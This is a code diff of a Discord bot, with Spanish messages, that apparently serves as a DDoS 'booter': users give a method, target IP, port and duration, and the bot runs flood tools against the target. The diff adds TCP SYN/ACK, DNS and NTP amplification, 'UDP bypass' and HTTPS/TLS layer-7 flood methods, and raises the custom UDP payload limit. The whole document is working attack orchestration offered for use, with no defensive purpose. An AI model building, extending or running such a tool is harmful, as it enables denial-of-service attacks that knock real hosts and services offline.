@@ -65,67 +65,125 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         await ctx.send("El tiempo debe ser mayor a 0")
         return
 
+    comando = None
+
     if metodo == 'udp':
         comando = f'./udp {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
         await ctx.send(f'Successful Attack UDP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-    
+
     elif metodo == 'udphex':
         comando = f'./udphex {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack UDPHEX TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-    
+
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack UDPpps TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-    
+
     elif metodo == 'udpflood':
         comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack UDPFlood TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-    
+
     elif metodo == 'ovh':
         comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
         await ctx.send(f'Successful Attack OVH TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-    
+
     elif metodo == 'udppayload':
         if payload is None or payload == "null":
             await ctx.send("Falta el payload")
             return
-        
-        if len(payload) > 250:
-            await ctx.send("Payload maximo 250 bytes")
+
+        if len(payload) > 1024:
+            await ctx.send("Payload maximo 1024 bytes")
             return
-        
+
         import tempfile
         with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
             f.write(payload)
             temp_file = f.name
-        
+
         comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
         await ctx.send(f'Successful Attack UDPPayload TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int} Payload:{len(payload)}')
-    
+
     elif metodo == 'raknet':
         comando = f'go run raknet.go {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack RakNet TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
-    
+
+    elif metodo == 'udpbypass':
+        comando = f'./udpbypass {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack UDPBypass TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'tcp':
+        comando = f'./tcp {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack TCP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'tcp-syn':
+        comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack TCP-SYN TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'tcp-ack':
+        comando = f'./tcp-ack {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack TCP-ACK TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'tcp-tls':
+        comando = f'./tcp-tls {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack TCP-TLS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'dns':
+        comando = f'./dns {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack DNS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'ntp':
+        comando = f'./ntp {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack NTP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'https-raw':
+      comando = f'./httpsraw {ip} {port_int} {tiempo_int}'
+      await ctx.send(f'Successful Attack HTTPs-Raw TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'tls':
+        comando = f'./tls {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack TLS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
+    elif metodo == 'https-request':
+        comando = f'./httpsrequest {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack HTTPs-Request TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+
     else:
-        await ctx.send('Métodos: udp, udphex, udppps, udpflood, ovh, udppayload, raknet')
+        await ctx.send('Método no encontrado, usa !methods')
         return
 
     try:
-        asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int))
+        if comando:
+            asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int))
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
 @bot.command(name='methods')
 async def show_methods(ctx):
     methods_info = """
-**Métodos disponibles:**
-• **udp** - UDPFlood
-• **udphex** - UDPHEX
-• **udppps** - UDPpps
-• **udpflood** - UDPFlood Go
-• **ovh** - OVH bypass
-• **udppayload** - Payload personalizable
-• **raknet** - RakNet attack
+Methods L4 UDP Protocol:
+• udp
+• udphex
+• udppps
+• udpflood
+• udppayload
+• udpbypass
+• raknet
+
+Methods L4 TCP Protocol:
+• tcp
+• tcp-syn
+• tcp-ack
+• tcp-tls
+
+Methods AMP:
+• dns
+• ntp
+
+Methods L7:
+• https-raw
+• tls
+• https-request
 """
     await ctx.send(methods_info)
 
